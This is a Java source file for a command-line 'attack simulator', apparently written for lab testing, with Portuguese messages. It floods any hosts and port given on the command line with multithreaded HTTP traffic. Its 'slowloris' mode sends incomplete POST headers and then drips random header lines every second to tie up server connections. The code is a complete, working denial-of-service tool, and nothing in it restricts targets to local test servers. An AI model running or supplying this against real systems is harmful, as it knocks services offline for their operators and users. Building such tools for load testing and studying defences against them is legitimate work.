package b.attack.simulator;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class AttackSimulator {
    private static final Set<String> SUPPORTED_MODES = Set.of("normal", "slowloris");

    public static void main(String[] args) {
        if (args.length < 4) {
            System.out.println("Uso: java AttackSimulator localhost 8080 10 normal");
            System.out.println("Modo: normal | slowloris");
            return;
        }

        List<String> hosts = parseHosts(args[0]);
        if (hosts.isEmpty()) {
            System.err.println("Nenhum host valido informado.");
            return;
        }

        Integer port = parsePort(args[1]);
        Integer threadCountPerHost = parsePositiveInt(args[2], "threads");
        if (port == null || threadCountPerHost == null) {
            return;
        }

        String mode = args[3].trim().toLowerCase(Locale.ROOT);
        if (!SUPPORTED_MODES.contains(mode)) {
            System.err.println("Modo invalido: " + args[3] + ". Use: normal | slowloris");
            return;
        }

        int totalThreads;
        try {
            totalThreads = Math.multiplyExact(hosts.size(), threadCountPerHost);
        } catch (ArithmeticException e) {
            System.err.println("Quantidade de threads excede o limite suportado.");
            return;
        }

        AtomicBoolean running = new AtomicBoolean(true);
        ExecutorService executor = Executors.newFixedThreadPool(totalThreads);
        Runtime.getRuntime().addShutdownHook(new Thread(
                () -> shutdownExecutor(executor, running),
                "attack-simulator-shutdown"));

        for (String host : hosts) {
            for (int i = 0; i < threadCountPerHost; i++) {
                executor.submit(new AttackTask(host, port, mode, running));
            }
        }

        executor.shutdown();
        try {
            while (!executor.awaitTermination(1, TimeUnit.SECONDS)) {
                if (!running.get()) {
                    break;
                }
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } finally {
            shutdownExecutor(executor, running);
        }
    }

    private static List<String> parseHosts(String rawHosts) {
        List<String> hosts = new ArrayList<>();
        for (String host : rawHosts.split(",")) {
            String trimmedHost = host.trim();
            if (!trimmedHost.isEmpty()) {
                hosts.add(trimmedHost);
            }
        }
        return hosts;
    }

    private static Integer parsePort(String rawPort) {
        try {
            int port = Integer.parseInt(rawPort);
            if (port < 1 || port > 65535) {
                System.err.println("Porta invalida: " + rawPort + ". Use valor entre 1 e 65535.");
                return null;
            }
            return port;
        } catch (NumberFormatException e) {
            System.err.println("Porta invalida: " + rawPort + ".");
            return null;
        }
    }

    private static Integer parsePositiveInt(String rawValue, String argumentName) {
        try {
            int parsed = Integer.parseInt(rawValue);
            if (parsed <= 0) {
                System.err.println(argumentName + " deve ser maior que zero.");
                return null;
            }
            return parsed;
        } catch (NumberFormatException e) {
            System.err.println(argumentName + " invalido: " + rawValue + ".");
            return null;
        }
    }

    private static void shutdownExecutor(ExecutorService executor, AtomicBoolean running) {
        if (!running.compareAndSet(true, false)) {
            return;
        }

        executor.shutdownNow();
        try {
            if (!executor.awaitTermination(10, TimeUnit.SECONDS)) {
                System.err.println("Nem todas as tarefas finalizaram apos o timeout.");
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } finally {
            LoggerUtil.closeAll();
        }
    }
}

class AttackTask implements Runnable {
    private final String host;
    private final int port;
    private final String mode;
    private final BandwidthTracker tracker;
    private final AtomicBoolean running;

    public AttackTask(String host, int port, String mode, AtomicBoolean running) {
        this.host = host;
        this.port = port;
        this.mode = mode;
        this.running = running;
        this.tracker = new BandwidthTracker();
    }

    @Override
    public void run() {
        try {
            if ("slowloris".equals(mode)) {
                simulateSlowloris();
            } else {
                simulateNormalTraffic();
            }
        } finally {
            LoggerUtil.logToFile(host, "TOTAL Enviado: " + tracker.getSentBytes() +
                    " bytes, Recebido: " + tracker.getReceivedBytes() + " bytes");
        }
    }

    private void simulateNormalTraffic() {
        try (Socket socket = new Socket(host, port)) {
            socket.setSoTimeout(1000);
            OutputStream out = socket.getOutputStream();
            InputStream in = socket.getInputStream();
            long start = System.currentTimeMillis();

            while (running.get() && !Thread.currentThread().isInterrupted()) {
                try {
                    String request = "GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
                    byte[] requestBytes = request.getBytes(StandardCharsets.US_ASCII);
                    out.write(requestBytes);
                    out.flush();
                    tracker.addSent(requestBytes.length);

                    byte[] buffer = new byte[1024];
                    int bytesRead = in.read(buffer);
                    if (bytesRead == -1) {
                        break;
                    }

                    tracker.addReceived(bytesRead);
                    long end = System.currentTimeMillis();
                    String log = "[NORMAL][" + host + "] Tempo: " + (end - start) + "ms, Bytes recebidos: " + bytesRead;
                    LoggerUtil.logToFile(host, log);
                    start = end;
                } catch (SocketTimeoutException e) {
                    // keep-alive sem resposta imediata
                } catch (SocketException e) {
                    LoggerUtil.logToFile(host, "[NORMAL] Conexao encerrada.");
                    break;
                }
            }
        } catch (IOException e) {
            LoggerUtil.logToFile(host, "Erro: " + e.getMessage());
        }
    }

    private void simulateSlowloris() {
        try (Socket socket = new Socket(host, port)) {
            OutputStream out = socket.getOutputStream();

            String[] headers = {
                    "POST / HTTP/1.1\r\n",
                    "Host: " + host + "\r\n",
                    "Content-Length: 10000\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n"
            };

            for (String header : headers) {
                if (!running.get() || Thread.currentThread().isInterrupted()) {
                    return;
                }
                byte[] data = header.getBytes(StandardCharsets.US_ASCII);
                out.write(data);
                out.flush();
                tracker.addSent(data.length);
                LoggerUtil.logToFile(host, "[SLOWLORIS] Header parcial enviado.");
                Thread.sleep(500);
            }

            while (running.get() && !Thread.currentThread().isInterrupted()) {
                String slowLine = "X-a: " + ThreadLocalRandom.current().nextInt(10000) + "\r\n";
                byte[] data = slowLine.getBytes(StandardCharsets.US_ASCII);
                out.write(data);
                out.flush();
                tracker.addSent(data.length);
                LoggerUtil.logToFile(host, "[SLOWLORIS] Fragmento enviado.");
                Thread.sleep(1000);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            LoggerUtil.logToFile(host, "[SLOWLORIS] Thread interrompida.");
        } catch (IOException e) {
            LoggerUtil.logToFile(host, "[SLOWLORIS] Conexao finalizada: " + e.getMessage());
        }
    }
}
